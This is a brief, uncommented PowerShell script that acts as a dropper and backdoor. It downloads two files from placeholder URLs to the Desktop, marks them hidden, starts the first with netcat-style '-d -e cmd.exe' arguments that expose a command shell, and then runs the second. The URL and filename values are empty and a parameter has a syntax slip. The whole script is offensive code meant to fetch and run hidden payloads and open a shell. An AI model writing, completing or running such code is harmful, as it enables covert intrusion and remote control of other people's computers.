$url = ""
$desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
$filename = ""
$finalPath = Join-Path - Path $desktopPath -Childpath $filename

$url2 = ""
$filename2 = ""
$finalPath2 = Join-Path -Path $desktoPPath -ChildPath $filename2

Invoke-WebRequest -Uri $url -OutFile $finalPath
Set-ItemProperty -Path $finalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

Invoke-WebRequest -Uri $url2 -OutFile $finalPath2
Set-ItemProperty -Path $finalPath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

$params = "-d -e cmd.exe"

Start-Process -FilePath $finalPath -ArgumentList $params
Start-Process $finalPath2